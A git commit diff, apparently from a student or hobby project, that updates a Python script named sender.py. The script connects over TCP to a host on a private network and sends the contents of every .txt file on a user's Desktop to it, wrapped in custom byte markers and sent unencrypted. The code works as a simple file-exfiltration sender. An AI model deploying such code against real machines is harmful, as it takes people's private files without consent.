fc0394f56c7709a17ee969c64c7adcda762110d7
TravisBender <TravisBender11@gmail.com>
2020-05-02 15:20:02 -0700

    Update sender.py

--- sender.py
+++ sender.py
@@ -4,29 +4,33 @@ import socket
 socket_sender = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # connection to server using given port
-receiver_info = ("localhost", 59000)
+receiver_info = ("10.0.0.196", 59000)
 socket_sender.connect(receiver_info)
 
 
 pwd = os.getcwd()
-os.chdir("C:\Users\Sam\Desktop")  # example
-files = os.listdir("C:\Users\Sam\Desktop")
+os.chdir("C:\\Users\\user\\Desktop")  # example
+files = os.listdir("C:\\Users\\user\\Desktop")
 
-
+content = b''
 for file in files:
     if file.endswith(".txt"):
         print(file)
-
+        
+        # Open file, add relevant begin and filename markers between data
         f = open(file, "rb")
-        content = f.read(1024)
-
-        while content:
-            socket_sender.send(content)
-            content = f.read(1024)
-
+        content += b'\x00\x01\x02BEGIN\x00\x01\x02'
+        content += file.encode()
+        content += b'\x00\x01\x02FILENAME\x00\x01\x02'
+        content += f.read()
+        # Close file
         f.close()
+
+socket_sender.send(content)
+
+# Important! Do not encrypt this data!        
+socket_sender.send(b'\x00\x01\x02END\x00\x01\x02')
 
 #socket_sender.send(bytes("done"))
 
 socket_sender.close()
-
